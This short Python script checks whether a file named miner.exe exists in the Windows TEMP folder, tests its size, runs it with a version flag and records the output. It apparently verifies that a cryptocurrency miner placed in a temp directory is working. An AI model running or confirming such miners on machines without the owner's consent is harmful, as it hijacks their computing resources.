import os
import subprocess

temp = os.environ.get("TEMP", "C:\Windows\Temp")
miner_path = os.path.join(temp, "miner.exe")

# Check if file exists
exists = os.path.exists(miner_path)
size = os.path.getsize(miner_path) if exists else 0

# Try to run with --help to test
if exists and size > 1000000:
    try:
        r = subprocess.run([miner_path, "--version"], capture_output=True, text=True, timeout=5)
        out = r.stdout[:100] + r.stderr[:100]
    except Exception as e:
        out = str(e)[:100]
else:
    out = "file_missing"

result = f"path={miner_path},exists={exists},size={size},out={out}"
